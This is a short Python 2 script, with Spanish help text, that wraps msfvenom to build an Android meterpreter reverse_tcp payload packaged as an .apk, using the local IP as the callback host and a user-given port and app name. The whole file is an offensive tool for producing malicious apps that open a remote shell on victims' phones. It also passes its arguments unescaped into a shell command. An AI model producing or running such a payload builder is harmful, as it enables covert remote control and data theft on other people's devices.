import socket
import argparse
from subprocess import Popen, PIPE, STDOUT

class test:
    def get_ip_address(a):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    
    def launchProcess(a,command):
        p = Popen(command, stdout = PIPE, 
            stderr = STDOUT, shell = True)
        for line in p.stdout:
            print line.replace('\n', '')
        return 0
    
    def run(self):
        parser = argparse.ArgumentParser(description='Testing')
        #parser.add_argument('ip_remota', metavar='ipr', type=str, nargs='+',
                            #help='ip remota')
        parser.add_argument('app_name', metavar='name', type=str, nargs='+',
                            help='nombre de la app')
        parser.add_argument('lp', metavar='lp', type=str, nargs='+',
                            help='local port')
        args = parser.parse_args()
        
        print args.lp
        
        ipl = self.get_ip_address()
        print ipl
        com = "msfvenom -p android/meterpreter/reverse_tcp LHOST="+ipl+" LPORT="+args.lp[0]+" R >"+args.app_name[0]+".apk"
        
        self.launchProcess(com)
        
T = test()
T.run()